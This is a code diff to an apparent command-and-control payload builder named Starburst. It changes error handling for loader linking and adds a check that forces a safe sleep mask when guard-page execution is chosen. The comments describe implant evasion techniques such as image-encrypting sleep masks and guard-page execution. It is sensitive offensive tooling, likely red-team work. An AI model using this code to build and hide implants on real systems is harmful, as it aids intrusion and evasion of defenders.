@@ -474,15 +474,16 @@ class Starburst(PayloadType):
                 resp.build_message = f"Starburst {arch} shellcode: {len(shellcode)} bytes"
 
             elif output_type == "shellcode":
-                cp_result = await self._link_with_crystal_palace(
-                    shellcode, arch, agent_build_path)
-                if cp_result is None:
+                try:
+                    cp_result = await self._link_with_crystal_palace(
+                        shellcode, arch, agent_build_path)
+                except RuntimeError as e:
                     resp.status = BuildStatus.Error
-                    resp.build_message = "Crystal Palace linking failed"
+                    resp.build_message = f"Crystal Palace linking failed: {e}"
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Wrapping",
-                        StepStdout="Crystal Palace linking failed",
+                        StepStdout=f"Crystal Palace linking failed:\n{e}",
                         StepSuccess=False,
                     ))
                     return resp
@@ -490,15 +491,16 @@ class Starburst(PayloadType):
                 resp.build_message = f"Starburst {arch} Crystal Palace shellcode: {len(cp_result)} bytes"
 
             else:
-                linked_sc = await self._link_with_crystal_palace(
-                    shellcode, arch, agent_build_path)
-                if linked_sc is None:
+                try:
+                    linked_sc = await self._link_with_crystal_palace(
+                        shellcode, arch, agent_build_path)
+                except RuntimeError as e:
                     resp.status = BuildStatus.Error
-                    resp.build_message = "Crystal Palace linking failed for loader build"
+                    resp.build_message = f"Crystal Palace linking failed: {e}"
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Wrapping",
-                        StepStdout="Crystal Palace linking failed. Cannot build exe/dll/svc without it.",
+                        StepStdout=f"Crystal Palace linking failed:\n{e}",
                         StepSuccess=False,
                     ))
                     return resp
@@ -515,7 +517,8 @@ class Starburst(PayloadType):
                     ))
                     return resp
                 resp.payload = wrapped
-                resp.build_message = f"Starburst {arch} {output_type} (CPL linked): {len(wrapped)} bytes"
+                resp.build_message = f"Starburst {arch} {output_type} (CPL linked): {len(wrapped)} bytes" + \
+                    getattr(self, "compatibility_notes", "")
 
             ext_map = {"bin": "bin", "shellcode": "bin", "exe": "exe", "dll": "dll", "service_exe": "exe"}
             resp.updated_filename = f"starburst.{ext_map.get(output_type, 'bin')}"
@@ -1023,6 +1026,27 @@ class Starburst(PayloadType):
             "udrl": "MASK_UDRL",
             "custom": "MASK_CUSTOM",
         }
+
+        # IMAGE-ENCRYPTING SLEEP MASKS ARE INCOMPATIBLE WITH GUARD-PAGE EXEC.
+        # Guard-page streaming keeps most of .text zeroed + PAGE_GUARD; any fault
+        # during the sleep cycle invokes the VEH - which lives in .text. Ekko and
+        # full_image RC4/XOR the entire image BEFORE the wait, so the VEH then
+        # executes encrypted bytes and dies on the timer thread (beacon fails
+        # fast 0xC0000005 during the first sleep). Force MASK_DEFAULT whenever
+        # guard-page execution is selected; fields-only XOR never touches code.
+        try:
+            exec_method = (self.get_parameter("exec_method") or "").lower()
+        except Exception:
+            exec_method = ""
+        if exec_method == "guardpage" and mask != "default":
+            self.compatibility_notes = (
+                getattr(self, "compatibility_notes", "") +
+                f"\n[builder] sleep_mask '{mask}' is incompatible with "
+                f"exec_method=guardpage (VEH lives in .text, which the mask "
+                f"encrypts); forcing sleep_mask=default"
+            )
+            mask = "default"
+
         defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask, 'MASK_DEFAULT')}")
 
         try:
@@ -1105,7 +1129,7 @@ class Starburst(PayloadType):
                 logger.error("Built-in UDRL loader not found at loaders/crystal-palace/udrl/")
                 return None
             make_proc = await asyncio.create_subprocess_exec(
-                "make", "clean", "all",
+                "make", "clean", arch,
                 cwd=loader_path, env=_make_env(),
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
@@ -1177,12 +1201,14 @@ class Starburst(PayloadType):
             logger.info(f"Crystal Palace stderr: {cp_stderr_text}")
 
         if proc.returncode != 0:
-            logger.error(f"Crystal Palace link failed (rc={proc.returncode}): {cp_stdout_text}\n{cp_stderr_text}")
-            return None
+            detail = f"rc={proc.returncode}: {cp_stdout_text}\n{cp_stderr_text}".strip()
+            logger.error(f"Crystal Palace link failed ({detail})")
+            raise RuntimeError(detail)
 
         if not os.path.exists(out_file):
-            logger.error(f"Crystal Palace produced no output at {out_file}")
-            return None
+            detail = (cp_stdout_text + "\n" + cp_stderr_text).strip() or "no output produced"
+            logger.error(f"Crystal Palace produced no output at {out_file}: {detail}")
+            raise RuntimeError(detail)
 
         with open(out_file, "rb") as f:
             return f.read()
